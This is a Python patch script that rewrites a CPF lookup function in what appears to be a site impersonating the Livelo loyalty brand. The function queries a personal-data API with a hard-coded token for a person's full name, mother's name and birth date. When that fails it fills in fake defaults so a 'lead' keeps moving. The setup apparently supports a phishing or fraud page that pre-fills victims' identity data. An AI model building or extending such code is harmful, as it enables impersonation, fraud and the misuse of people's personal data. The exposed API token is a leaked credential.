import os
import re

app_path = r'd:\Paginas ADS\Livelo\app.py'
with open(app_path, 'r', encoding='utf-8') as f:
    app_content = f.read()

pattern = r'def lookup_cpf\(cpf_raw.*?return None'

new_lookup_cpf = """def lookup_cpf(cpf_raw: str, data_nasc: str = "") -> Optional[dict]:
    cpf = re.sub(r"\\\\D", "", cpf_raw)
    
    # Hub do Desenvolvedor API - V2 Cadastro PF (Busca completa sem data)
    if cpf:
        try:
            import requests
            token = "219648175aXyEcieuSW396568120"
            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cadastropf/?cpf={cpf}&token={token}"
            res = requests.get(url, timeout=10)
            data = res.json()
            if data.get("status"):
                res_info = data.get("result", {})
                return {
                    "nome": res_info.get("nomeCompleto", "CLIENTE LIVELO"),
                    "nome_mae": res_info.get("nomeDaMae", "MARIA LIVELO"),
                    "data_nasc": res_info.get("dataDeNascimento", "01/01/1990"),
                    "saldo_api": data.get("saldo", 0)
                }
        except Exception as e:
            log.error(f"Erro na API de CPF: {e}")
            
        # Fallback para o lead não travar
        return {
            "nome": "JOÃO DA SILVA",
            "nome_mae": "MARIA DA SILVA",
            "data_nasc": "15/05/1985",
            "saldo_api": 0
        }
    return None"""

app_content = re.sub(pattern, new_lookup_cpf, app_content, flags=re.DOTALL)

with open(app_path, 'w', encoding='utf-8') as f:
    f.write(app_content)
    
print("app.py updated with the correct API!")
